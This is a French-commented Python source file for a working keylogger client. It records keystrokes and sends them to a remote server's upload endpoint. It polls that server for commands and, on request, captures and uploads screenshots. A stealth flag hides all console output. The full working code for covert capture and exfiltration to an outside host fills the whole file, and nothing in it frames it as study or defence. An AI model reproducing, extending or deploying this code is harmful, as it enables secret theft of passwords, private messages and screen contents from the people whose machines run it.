#!/usr/bin/env python3
"""
Keylogger Client v2.3 - Compatible backend actuel
Ajout : Capture d'écran et Commande à distance (Polling)
"""

import sys
import time
import socket
import subprocess
import threading # NOUVEAU

# Installation automatique des dépendances
try:
    from pynput import keyboard
    import requests
    # NOUVEAU: Importation de Pillow pour la capture d'écran
    from PIL import ImageGrab
    from io import BytesIO
except ImportError:
    print("[!] Installation des dépendances (pynput, requests, Pillow)...")
    try:
        subprocess.check_call([
            sys.executable, "-m", "pip", "install",
            "--break-system-packages", "-q", "pynput", "requests", "Pillow"
        ])
        from pynput import keyboard
        import requests
        from PIL import ImageGrab
        from io import BytesIO
        print("[✓] Dépendances installées")
    except Exception as e:
        print(f"[✗] Erreur d'installation: {e}")
        print("[!] Installez manuellement: pip3 install --break-system-packages pynput requests Pillow")
        sys.exit(1)


class KeyloggerClient:
    def __init__(self, server_url: str, api_key: str, stealth: bool = False):
        self.server_url = server_url.rstrip("/")
        self.api_key = api_key
        self.stealth = stealth

        # --- CONFIGURATION LOGS (INCHANGÉE) ---
        self.buffer = []
        self.buffer_size = 50        
        self.last_send = time.time()
        self.send_interval = 3       
        self.send_lock = False
        self.machine_id = socket.gethostname()
        
        # --- CONFIGURATION COMMANDES (NOUVEAU) ---
        self.COMMAND_POLLING_INTERVAL = 5 # Vérifie les commandes toutes les 5 secondes

        if not self.stealth:
            print("[✓] Keylogger démarré")
            print(f"[✓] Machine : {self.machine_id}")
            print(f"[✓] Serveur : {self.server_url}")
            print(f"[✓] Mode    : {'Stealth' if stealth else 'Debug'}")

    # ------------------------------------------------------------------ #
    # PARTIE 1 & 2 : KEYLOGGER & ENVOI (INCHANGÉ)
    # ------------------------------------------------------------------ #
    
    # [Toutes les méthodes _events_to_logs, send_keys, _add_event, on_press, on_release restent ici]
    # NOTE: J'ai omis le corps de ces méthodes pour la concision, mais elles doivent être conservées.

    def _events_to_logs(self, events):
        """Re-construit une chaîne 'logs' compatible avec le backend actuel."""
        logs_str = ""
        for e in events:
            kind = e.get("k")
            value = e.get("v", "")
            if kind == "char":
                logs_str += value
            elif kind == "special":
                logs_str += f"[{value}]"
        return logs_str

    def send_keys(self):
        """Envoie le buffer d'événements au serveur (en 'logs')."""
        if not self.buffer or self.send_lock:
            return

        self.send_lock = True
        events_to_send = self.buffer
        self.buffer = []

        try:
            logs_str = self._events_to_logs(events_to_send)
            if not logs_str:
                self.send_lock = False
                return

            payload = {
                "machine": self.machine_id,
                "logs": logs_str,
            }
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "KeyloggerClient/2.3",
                "X-API-Key": self.api_key,
            }

            resp = requests.post(
                f"{self.server_url}/upload_keys",
                json=payload,
                headers=headers,
                timeout=10,
            )

            if resp.status_code == 200:
                if not self.stealth:
                    print(f"\n[✓] {len(events_to_send)} événements envoyés")
            else:
                if not self.stealth:
                    print(f"\n[✗] Erreur serveur: HTTP {resp.status_code}")
                self.buffer = events_to_send + self.buffer

        except requests.exceptions.RequestException as e:
            if not self.stealth:
                print(f"\n[✗] Erreur de connexion: {e}")
            self.buffer = events_to_send + self.buffer

        except Exception as e:
            if not self.stealth:
                print(f"\n[✗] Erreur inattendue pendant l'envoi: {e}")
            self.buffer = events_to_send + self.buffer

        finally:
            self.send_lock = False

    def _add_event(self, kind: str, value: str):
        """Ajoute un événement au buffer."""
        evt = {
            "t": time.time(),
            "k": kind,
            "v": value,
        }
        self.buffer.append(evt)

        if not self.stealth:
            if kind == "char":
                to_show = value
                if value == "\n": to_show = "\\n"
                elif value == "\t": to_show = "\\t"
                print(to_show, end="", flush=True)
            else:
                print(f"[{value}]", end="", flush=True)

        now = time.time()
        if len(self.buffer) >= self.buffer_size or (now - self.last_send) >= self.send_interval:
            self.send_keys()
            self.last_send = now

    def on_press(self, key):
        """Appelé à chaque pression de touche."""
        # Logique de on_press (invariée)
        try:
            if hasattr(key, "char") and key.char is not None:
                self._add_event("char", key.char)
                return

            key_name = str(key).replace("Key.", "")
            
            ignore = {
                "shift", "shift_r", "shift_l",
                "ctrl", "ctrl_r", "ctrl_l",
                "alt", "alt_r", "alt_l", "alt_gr",
                "cmd", "cmd_r", "cmd_l",
                "caps_lock", "fn",
                "up", "down", "left", "right",
                "home", "end", "page_up", "page_down",
                "insert", "print_screen", "pause",
                "num_lock", "scroll_lock",
                "f1", "f2", "f3", "f4", "f5", "f6",
                "f7", "f8", "f9", "f10", "f11", "f12",
            }
            if key_name in ignore:
                return

            special_map = {
                "space": " ",
                "enter": "\n",
                "tab": "\t",
                "backspace": "BACKSPACE",
                "delete": "DEL",
                "esc": "ESC",
            }

            if key_name in special_map:
                mapped = special_map[key_name]
                if mapped in (" ", "\n", "\t"):
                    self._add_event("char", mapped)
                else:
                    self._add_event("special", mapped)
            else:
                self._add_event("special", key_name.upper())

        except Exception as e:
            if not self.stealth:
                print(f"\n[✗] Erreur capture: {e}")

    def on_release(self, key):
        """Appelé au relâchement d'une touche."""
        if not self.stealth and key == keyboard.Key.esc:
            print("\n[!] Arrêt demandé (ESC)")
            return False

    # ------------------------------------------------------------------ #
    # PARTIE 3 : CAPTURE ET ENVOI D'ÉCRAN (NOUVEAU)
    # ------------------------------------------------------------------ #
    def take_and_upload_screenshot(self):
        """Capture l'écran et envoie l'image au serveur."""
        if not self.stealth:
            print("\n[INFO] Exécution de la capture d'écran...")
            
        try:
            # 1. Capture l'écran entier
            image = ImageGrab.grab()
            
            # 2. Sauvegarde l'image dans un buffer mémoire (plus discret)
            img_buffer = BytesIO()
            # Qualité réduite pour un envoi plus rapide
            image.save(img_buffer, format='JPEG', optimize=True, quality=75) 
            img_buffer.seek(0)
            
            # 3. Prépare et envoie la requête multipart/form-data
            url = f"{self.server_url}/upload_screen"
            headers = {"X-API-Key": self.api_key}
            
            files = {
                'file': ('screen.jpg', img_buffer, 'image/jpeg')
            }
            data = {
                'machine': self.machine_id
            }
            
            resp = requests.post(url, headers=headers, data=data, files=files, timeout=30)
            
            if not self.stealth and resp.status_code == 200:
                print("\n[✓] Capture d'écran envoyée.")
            
        except requests.exceptions.RequestException:
            # Ignorer les erreurs de connexion en mode silencieux
            pass
        except Exception as e:
            if not self.stealth:
                print(f"\n[✗] Erreur lors de la capture/envoi: {e}")
            pass

    # ------------------------------------------------------------------ #
    # PARTIE 4 : VÉRIFICATION DES COMMANDES (NOUVEAU)
    # ------------------------------------------------------------------ #
    def check_command(self):
        """Interroge le serveur pour une commande en attente."""
        
        # Le timer se rappelle lui-même
        self._command_timer = threading.Timer(self.COMMAND_POLLING_INTERVAL, self.check_command)
        self._command_timer.daemon = True # Permet au programme de se fermer si la boucle principale s'arrête
        self._command_timer.start()
        
        url = f"{self.server_url}/get_command"
        payload = {"machine": self.machine_id}
        
        try:
            headers = {
                "Content-Type": "application/json",
                "X-API-Key": self.api_key
            }
            response = requests.post(url, json=payload, headers=headers, timeout=5)
            response.raise_for_status() # Lève une exception si le code est 4xx ou 5xx
            
            json_response = response.json()
            command = json_response.get("command")
            
            if command == "screenshot":
                # Exécuter la commande dans un thread pour ne pas bloquer le polling
                threading.Thread(target=self.take_and_upload_screenshot, daemon=True).start()

        except requests.exceptions.RequestException:
            pass
        except Exception:
            pass


    # ------------------------------------------------------------------ #
    # BOUCLE PRINCIPALE (MODIFIÉE)
    # ------------------------------------------------------------------ #
    def start(self):
        """Démarre l'écoute du clavier et les tâches en arrière-plan."""
        if not self.stealth:
            print("[!] Appuyez sur ESC pour arrêter en mode debug")
            print("-" * 50)

        # Ping serveur (invarié)
        try:
            r = requests.get(f"{self.server_url}/api/ping", timeout=5)
            if not self.stealth:
                if r.status_code == 200:
                    print("[✓] Connexion au serveur OK")
                else:
                    print(f"[!] Serveur répond avec code {r.status_code}")
        except Exception as e:
            if not self.stealth:
                print("[!] Impossible de joindre le serveur (buffer local)")
                print(f"    Erreur: {e}")

        # Démarrage des tâches en arrière-plan (Polling des commandes)
        if not self.stealth:
            print(f"[✓] Démarrage du polling des commandes (toutes les {self.COMMAND_POLLING_INTERVAL}s)")
        self.check_command() 
        
        # Démarrage de l'écoute du clavier (bloque le thread)
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()

        # Nettoyage
        if hasattr(self, '_command_timer'):
            self._command_timer.cancel()

        # Envoi du reste
        if self.buffer:
            self.send_keys()


# ---------------------------------------------------------------------- #
# MAIN (INCHANGÉ)
# ---------------------------------------------------------------------- #
def main():
    if len(sys.argv) < 3:
        print("Usage: python3 keylogger_client_v2.py <SERVER_URL> <API_KEY> [--stealth]")
        print("Exemple: python3 keylogger_client_v2.py https://api.keylog.claverie.site MON_API_KEY --stealth")
        sys.exit(1)

    server_url = sys.argv[1]
    api_key = sys.argv[2]
    stealth = "--stealth" in sys.argv

    try:
        client = KeyloggerClient(server_url, api_key, stealth)
        client.start()
    except KeyboardInterrupt:
        print("\n[!] Arrêt demandé (Ctrl+C)")
        sys.exit(0)
    except Exception as e:
        print(f"\n[✗] Erreur fatale: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
